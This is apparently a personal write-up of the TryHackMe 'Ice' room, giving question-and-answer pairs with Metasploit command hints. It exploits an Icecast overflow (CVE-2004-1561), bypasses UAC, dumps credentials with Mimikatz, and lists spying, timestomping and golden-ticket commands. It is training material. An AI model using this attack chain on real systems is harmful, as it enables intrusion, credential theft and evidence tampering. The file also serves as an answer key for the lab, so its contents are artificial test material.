@@ -1,0 +1,128 @@
+#Task 2 Recon 
+- Once the scan completes, we'll see a number of interesting ports open on this machine. As you might have guessed, the firewall has been disabled (with the service completely shutdown), leaving very little to protect this machine. One of the more interesting ports that is open is Microsoft Remote Desktop (MSRDP). What port is this open on?
+hint: my kali: echo $ip ice > /etc/hosts
+nmap -sV -Pn -vv ice
+3389
+
+
+- What service did nmap identify as running on port 8000? (First word of this service)
+Icecast
+
+- What does Nmap identify as the hostname of the machine? (All caps for the answer)
+dark-pc
+
+
+#Task 3 Gain Access 
+- Now that we've identified some interesting services running on our target machine, let's do a little bit of research into one of the weirder services identified: Icecast. Icecast, or well at least this version running on our target, is heavily flawed and has a high level vulnerability with a score of 7.5 (7.4 depending on where you view it). What type of vulnerability is it? Use https://www.cvedetails.com for this question and the next.
+hint: https://www.cvedetails.com/ search icecast
+Execute CodeOverflow
+
+
+- What is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000
+CVE-2004-1561
+
+
+- After Metasploit has started, let's search for our target exploit using the command 'search icecast'. What is the full path (starting with exploit) for the exploitation module? This module is also referenced in 'RP: Metasploit' which is recommended to be completed prior to this room, although not entirely necessary. 
+hint: msf6>search icecast
+exploit/windows/http/icecast_header 
+
+
+- Following selecting our module, we now have to check what options we have to set. Run the command `show options`. What is the only required setting which currently is blank? 
+rhosts
+
+
+#Task 4 Escalate 
+- Woohoo! We've gained a foothold into our victim machine! What's the name of the shell we have now?
+hint:msf6>use exploit/windows/http/icecast_header
+set rhosts ice
+set lhosts myip
+run
+meterpreter
+
+
+- What user was running that Icecast process? The commands used in this question and the next few are taken directly from the 'RP: Metasploit' room. 
+hint: meterpreter>getuid
+Dark
+
+
+- What build of Windows is the system?
+hint: sysinfo
+7601
+
+- Now that we know some of the finer details of the system we are working with, let's start escalating our privileges. First, what is the architecture of the process we're running?
+x64
+
+
+- Running the local exploit suggester will return quite a few results for potential escalation exploits. What is the full path (starting with exploit/) for the first returned exploit?
+hint: meterpreter>run post/multi/recon/local_exploit_suggester
+exploit/windows/local/bypassuac_eventvwr
+
+
+- Now that we've set our session number, further options will be revealed in the options menu. We'll have to set one more as our listener IP isn't correct. What is the name of this option?
+hint: meterpreter>Ctrl+Z
+y
+use exploit/windows/local/bypassuac_eventvwr
+show options
+lhost
+
+
+- We can now verify that we have expanded permissions using the command `getprivs`. What permission listed allows us to take ownership of files?
+hint: meterpreter>getprivs
+SeTakeOwnershipPrivilege
+
+# Task 5 Looting 
+- In order to interact with lsass we need to be 'living in' a process that is the same architecture as the lsass service (x64 in the case of this machine) and a process that has the same permissions as lsass. The printer spool service happens to meet our needs perfectly for this and it'll restart if we crash it! What's the name of the printer service?
+Mentioned within this question is the term 'living in' a process. Often when we take over a running program we ultimately load another shared library into the program (a dll) which includes our malicious code. From this, we can spawn a new thread that hosts our shell. 
+hint:meterpreter>ps
+spoolsv.exe
+
+
+- Let's check what user we are now with the command `getuid`. What user is listed?
+hint: meterpreter>migrate -N spoolsv.exe
+getuid
+NT AUTHORITY\SYSTEM
+
+
+
+- Which command allows up to retrieve all credentials?
+hint: meterpreter>load kiwi
+help
+creds_all
+
+
+- Run this command now. What is Dark's password? Mimikatz allows us to steal this password out of memory even without the user 'Dark' logged in as there is a scheduled task that runs the Icecast as the user 'Dark'. It also helps that Windows Defender isn't running on the box ;) (Take a look again at the ps list, this box isn't in the best shape with both the firewall and defender disabled)
+Password01
+
+
+#Task 6 Post-Exploitation 
+- What command allows us to dump all of the password hashes stored on the system? We won't crack the Administrative password in this case as it's pretty strong (this is intentional to avoid password spraying attempts)
+hint: meterpreter>hashdump
+hashdump
+
+
+- While more useful when interacting with a machine being used, what command allows us to watch the remote user's desktop in real time?
+hint: meterpreter>help
+screenshare
+
+
+- How about if we wanted to record from a microphone attached to the system?
+hint: meterpreter>help
+record_mic
+
+
+- To complicate forensics efforts we can modify timestamps of files on the system. What command allows us to do this? Don't ever do this on a pentest unless you're explicitly allowed to do so! This is not beneficial to the defending team as they try to breakdown the events of the pentest after the fact.
+hint:meterpreter>help
+timestomp
+
+
+- Mimikatz allows us to create what's called a `golden ticket`, allowing us to authenticate anywhere with ease. What command allows us to do this?
+Golden ticket attacks are a function within Mimikatz which abuses a component to Kerberos (the authentication system in Windows domains), the ticket-granting ticket. In short, golden ticket attacks allow us to maintain persistence and authenticate as any user on the domain.
+hint:meterpreter>help
+golden_ticket_create
+
+
+https://tryhackme.com/room/ice
+https://ratiros01.medium.com/tryhackme-ice-d26eaed6f090
+https://www.secjuice.com/write-up-05-tryhackme-ice/
+https://0xsmiley.github.io/2020-04-27-Ice/
+https://stawm.design.blog/2020/05/08/ice-tryhackme-writeup/
